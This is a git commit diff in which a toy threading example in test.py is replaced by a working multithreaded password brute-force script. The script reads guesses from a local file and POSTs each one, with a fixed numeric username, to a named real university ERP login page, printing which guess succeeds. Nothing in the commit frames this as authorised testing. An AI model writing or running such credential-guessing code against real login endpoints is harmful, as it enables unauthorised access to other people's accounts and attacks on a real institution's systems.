7c5800f72270784f850659a8d1ead204ee77ffe1
0xmk4y <bismarck.a360@gmail.com>
2023-01-12 10:32:29 +0000

    useing map method

--- test.py
+++ test.py
@@ -1,7 +1,26 @@
+import concurrent.futures
+import requests
 
-import threading
+url = 'https://erp.gctu.edu.gh/sip/auth/login.php'
 
-def sqr(x):
-    print(x*x)
+def connect(passwd):
+    username = 4231220076
 
-sqr(7)
+    data ={
+        "username":username,
+        "password":passwd
+    }
+    r = requests.post(url, data=data)
+    if r.text == 'ok':
+        return f"correct password {passwd}"
+    return f"wrong password {passwd}"
+
+
+with open("pass.txt") as f:
+       
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        pass_list = f.readlines()
+        results = executor.map(connect, pass_list)
+
+        for result in results:
+            print(result)
